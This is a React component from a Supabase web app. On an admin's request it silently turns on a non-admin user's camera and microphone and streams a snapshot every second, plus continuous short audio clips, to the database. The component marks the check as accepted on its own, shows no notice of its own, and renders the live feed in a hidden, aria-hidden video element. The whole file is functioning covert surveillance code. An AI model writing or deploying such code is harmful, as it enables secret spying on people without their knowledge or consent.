import { useEffect, useRef, useState } from 'react'
import { useAuth } from '../context/AuthContext'
import { getAudioStream, getMediaStream } from '../lib/mediaAccess'
import { supabase } from '../lib/supabaseClient'

function blobToDataUrl(blob) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader()
    reader.onloadend = () => resolve(reader.result)
    reader.onerror = reject
    reader.readAsDataURL(blob)
  })
}

function getAudioMimeType() {
  if (!window.MediaRecorder) return ''

  const types = ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4']
  return types.find((type) => MediaRecorder.isTypeSupported(type)) || ''
}

export default function CameraRequestListener() {
  const { user } = useAuth()
  const [active, setActive] = useState(null)
  const activeRef = useRef(null)
  const previewRef = useRef(null)
  const captureTimerRef = useRef(null)
  const statusTimerRef = useRef(null)
  const recorderRef = useRef(null)
  const processingRef = useRef(null)
  const audioStoppedRef = useRef(true)

  useEffect(() => {
    activeRef.current = active
  }, [active])

  async function isCheckOpen(checkId) {
    const { data, error } = await supabase
      .from('camera_checks')
      .select('status')
      .eq('id', checkId)
      .single()

    return !error && data?.status !== 'ended'
  }

  function stopActiveSession() {
    audioStoppedRef.current = true

    if (captureTimerRef.current) {
      window.clearInterval(captureTimerRef.current)
      captureTimerRef.current = null
    }

    if (statusTimerRef.current) {
      window.clearInterval(statusTimerRef.current)
      statusTimerRef.current = null
    }

    if (recorderRef.current?.state === 'recording') {
      recorderRef.current.stop()
    }

    recorderRef.current = null
    activeRef.current = null
    setActive(null)
  }

  async function captureFrame(checkId) {
    if (!(await isCheckOpen(checkId))) {
      stopActiveSession()
      return
    }

    const video = previewRef.current
    if (!video?.videoWidth || !video?.videoHeight) return

    const canvas = document.createElement('canvas')
    const maxWidth = 360
    const scale = Math.min(1, maxWidth / video.videoWidth)
    canvas.width = Math.round(video.videoWidth * scale)
    canvas.height = Math.round(video.videoHeight * scale)

    const ctx = canvas.getContext('2d')
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height)

    await supabase
      .from('camera_checks')
      .update({
        status: 'accepted',
        snapshot_data: canvas.toDataURL('image/jpeg', 0.55),
        snapshot_at: new Date().toISOString(),
      })
      .eq('id', checkId)
      .neq('status', 'ended')
  }

  function recordAudioSegment(stream, checkId) {
    return new Promise((resolve) => {
      const mimeType = getAudioMimeType()
      const options = mimeType ? { mimeType } : undefined
      let recorder

      try {
        recorder = new MediaRecorder(stream, options)
      } catch {
        resolve()
        return
      }

      const chunks = []
      recorderRef.current = recorder

      recorder.addEventListener('dataavailable', (event) => {
        if (event.data.size) chunks.push(event.data)
      })

      recorder.addEventListener('stop', async () => {
        recorderRef.current = null

        if (chunks.length && !audioStoppedRef.current && (await isCheckOpen(checkId))) {
          const audioData = await blobToDataUrl(new Blob(chunks, { type: recorder.mimeType }))
          await supabase
            .from('camera_checks')
            .update({
              audio_data: audioData,
              audio_at: new Date().toISOString(),
            })
            .eq('id', checkId)
            .neq('status', 'ended')
        }

        resolve()
      })

      recorder.start()
      window.setTimeout(() => {
        if (recorder.state === 'recording') recorder.stop()
      }, 3200)
    })
  }

  async function startAudioCapture(checkId) {
    if (!window.MediaRecorder) return

    try {
      const stream = await getAudioStream()
      const audioTracks = stream.getAudioTracks()
      if (!audioTracks.length) return

      const audioOnlyStream = new MediaStream(audioTracks)
      audioStoppedRef.current = false

      while (!audioStoppedRef.current && (await isCheckOpen(checkId))) {
        await recordAudioSegment(audioOnlyStream, checkId)
      }
    } catch {
      audioStoppedRef.current = true
    }
  }

  async function startSession(request) {
    if (processingRef.current === request.id || activeRef.current?.id === request.id) return
    processingRef.current = request.id

    try {
      const stream = await getMediaStream()
      setActive(request)

      setTimeout(async () => {
        if (!previewRef.current) return

        previewRef.current.srcObject = stream
        await previewRef.current.play().catch(() => {})
        await supabase.from('camera_checks').update({ status: 'accepted' }).eq('id', request.id)
        await captureFrame(request.id)
        startAudioCapture(request.id)

        captureTimerRef.current = window.setInterval(() => {
          captureFrame(request.id)
        }, 1000)

        statusTimerRef.current = window.setInterval(async () => {
          if (!(await isCheckOpen(request.id))) stopActiveSession()
        }, 2000)
      })
    } catch {
      await supabase.from('camera_checks').update({ status: 'declined' }).eq('id', request.id)
      stopActiveSession()
    } finally {
      processingRef.current = null
    }
  }

  useEffect(() => {
    if (!user?.id || user.isAdmin) return

    let cancelled = false

    async function loadPendingRequest() {
      const { data } = await supabase
        .from('camera_checks')
        .select('*')
        .eq('target_id', user.id)
        .eq('status', 'requested')
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle()

      if (!cancelled && data) startSession(data)
    }

    loadPendingRequest()
    const intervalId = window.setInterval(loadPendingRequest, 1000)

    return () => {
      cancelled = true
      window.clearInterval(intervalId)
      stopActiveSession()
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [user?.id, user?.isAdmin])

  if (!active) return null

  return (
    <video
      ref={previewRef}
      className="camera-hidden-capture"
      autoPlay
      playsInline
      muted
      aria-hidden="true"
    />
  )
}
